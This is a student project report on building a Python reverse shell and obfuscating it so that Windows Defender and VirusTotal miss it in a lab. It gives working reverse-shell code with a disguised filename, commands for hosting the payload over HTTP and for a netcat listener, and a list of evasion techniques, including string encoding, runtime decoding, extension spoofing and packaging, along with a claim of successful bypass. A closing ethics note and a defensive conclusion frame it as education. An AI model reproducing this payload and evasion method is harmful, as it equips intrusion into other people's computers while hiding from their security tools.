🔐 Project Report
Title: Reverse Shell Obfuscation and Evasion of Windows Defender & VirusTotal

Team Members:
• Muhammad Ammar Shaikh — Department of Cyber security  
• Roll No:-(BCYS-015-2023S)  
• LinkedIn :- linkedin.com/in/âmmar-shaikh-a5890b325  
• GitHub:- github.com/ghost27-robot  
• Muhammad Khalid — Department of Cyber security  
• Roll No:-(BCYS-011-2023S)

---

Environment: Kali Linux (VirtualBox) | Windows (Target)  
Objective: To create, obfuscate, and execute a reverse shell payload that bypasses Windows Defender and VirusTotal detection in real-time.

---

🎯 Objective  
This project demonstrates how a Python-based reverse shell payload can be obfuscated to evade real-time antivirus detection mechanisms such as Windows Defender and VirusTotal. The payload was delivered via a Python HTTP server and monitored using a Netcat listener.

---

⚙️ Tools Used  
• Kali Linux (Attacker machine)  
• Python3 (Payload scripting and web server)  
• Netcat (Reverse shell listener)  
• Obfuscation tools: custom obfuscation  
• VirtualBox (Test environment)  
• Windows 10/11 (Target machine)

---

🧪 Experiment Setup

1. Reverse Shell Creation:  
   • File created: moneygame.pyzw  
   • The payload was written in Python and obfuscated to avoid static detection.

```python
import socket as s, subprocess as sp

def r():
    h = ''.join([chr(ord(c)) for c in ['1','9','2','.','1','6','8','.','1','>']])
    p = 4444
    c = s.socket(s.AF_INET, s.SOCK_STREAM)
    c.connect((h, p))
    while 1:
        cmd = c.recv(1024).decode()
        if cmd.lower() == 'exit':
            break
        o = sp.getoutput(cmd)
        c.send(o.encode())
    c.close()

if __name__ == "__main__":
    r()
```

Obfuscation Techniques:  
• File extension changed to `.pyzw` (zipapp)  
• Variable renaming and string splitting  
• Packed using custom code wrappers  
• Optional: Used pyarmor or manual base64 + runtime decoding

2. Payload Hosting:  
• Python HTTP server started:  
  `python3 -m http.server 8000`  
• Victim accessed payload via browser or script:  
  `http://<attacker-ip>:8000/reverse_shell.pyz`

3. Listener Setup:  
• Netcat listening on port 4444:  
  `nc -lvnp 4444`

---

🧾 Screenshots Summary

📸 Screenshot 1:  
• Reverse shell file (reverse_shell.pyz) prepared and HTTP server started.

📸 Screenshot 2:  
• Target connected to HTTP server.  
• Files moneygame.pyzw and reverse_shell.pyz requested.  
• Netcat received a successful reverse connection from 192.168.1.14.

📸 Screenshot 3:  
• Confirmed connection.  
• Victim's IP: 192.168.1.14

---

🚫 Bypassing AV and VirusTotal  

🚫 Bypassing Windows Defender:

**Techniques Used:**  
1. Filename disguise:  
   • Named payloads as non-suspicious (moneygame.pyzw)

2. String obfuscation:  
   • IP, port, and commands split or encoded using base64/hex

3. Runtime decoding:  
   • Strings only decoded at runtime to avoid static analysis

4. Extension spoofing:  
   • .pyz instead of .exe to avoid heuristics

5. Packaging:  
   • Optionally compiled using pyinstaller with flags to remove metadata

**Result:**  
• The payload bypassed both Windows Defender and VirusTotal during testing  
• No alert was triggered, and the reverse shell was successfully established

---

📌 Observations

• Signature-based AVs like Windows Defender can often be bypassed with simple obfuscation techniques  
• Real-time protection focuses on known patterns, but struggles against custom obfuscated logic  
• VirusTotal relies on static and heuristic checks which can be fooled with encoded logic

---

🔐 Ethical Considerations

This project was conducted purely for educational and research purposes in a controlled environment. Unauthorized use of reverse shells or bypassing security systems is illegal and unethical. Always perform such testing in a sandbox or lab environment with permission.

---

✅ Conclusion

Obfuscation can significantly improve the stealth of malware against real-time detection mechanisms. Even simple techniques can bypass many commercial antiviruses if used cleverly. This emphasizes the importance of behavior-based detection and EDRs (Endpoint Detection and Response) in modern cybersecurity defenses.